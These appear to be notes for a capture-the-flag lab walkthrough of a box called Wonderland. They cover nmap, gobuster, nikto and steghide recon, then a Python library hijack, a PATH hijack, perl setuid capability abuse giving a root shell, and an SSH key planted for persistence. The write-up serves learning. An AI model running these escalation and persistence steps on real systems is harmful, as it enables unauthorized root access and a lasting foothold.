### Prepare
```bash
# add taget IP
mcedit /etc/hosts
nano /etc/hosts

mkdir wonderland
mkdir nmap 
mkdir misc 
```

### Recon 

```bash
nmap -sC -sV -oN def_scan.txt target
```

```bash
gobuster dir -u http://target/ -t 50 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```

```bash
nikto -h "http://target" | tee nikto.log
```

```
wget http://target/img/white_rabbit_1.jpg

steghide info white_rabbit_1.jpg

steghide extract -sf white_rabbit_1.jpg

cat hint.txt
```

---------
### On system 
```bash
# use credentials find before 
ssh alice@target 
```

```zsh 
# explain  id command 
# explain rules of permitions 
# explain suid bits and stuff
id 
whoami
uname -a 

# what is python import and how it works 
cat script.py
python3 walrus_and_the_carpenter.py

# eplain
sudo -l 

# one of the many variations 
echo "import subprocess;subprocess.call('/bin/bash');" > random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# or 
mcedit random.py
nano random.py

python 
import os 
os.system("/bin/bash -p")

import subprocess
subprocess.call('/bin/sh')


sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
# tadaaam
whoami
```
##### internal recon 

```bash
nc target 24591 > /dev/shm/linpeas.sh
# research wtf is linpeas? 
```


----------
### Escalation


# explain it
``` bash
mkdir .ssh
echo "ssh-rsa <key> kali@kali" > /home/rabbit/.ssh/authorized_keys
chmod 600 /home/rabbit/.ssh/authorized_keys
```

or
```bash
file teaParty
./teaParty
nc -w 0 -lvpn 23232 < teaParty
```

на своей системе 
```bash
string teaParty
man date 
ltrace ./teaParty
```

now we have a plan of attack
```bash
echo $PATH
mcedit date
add /bin/bash -p

chmod +x date 

echo $SHLVL
./date 
echo $SHLVL
```
### Last Step 
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

```zsh 
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
whoami 
```

```bash
getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
whoami
# root !!!!!

cat user.txt
cat root.txt
```
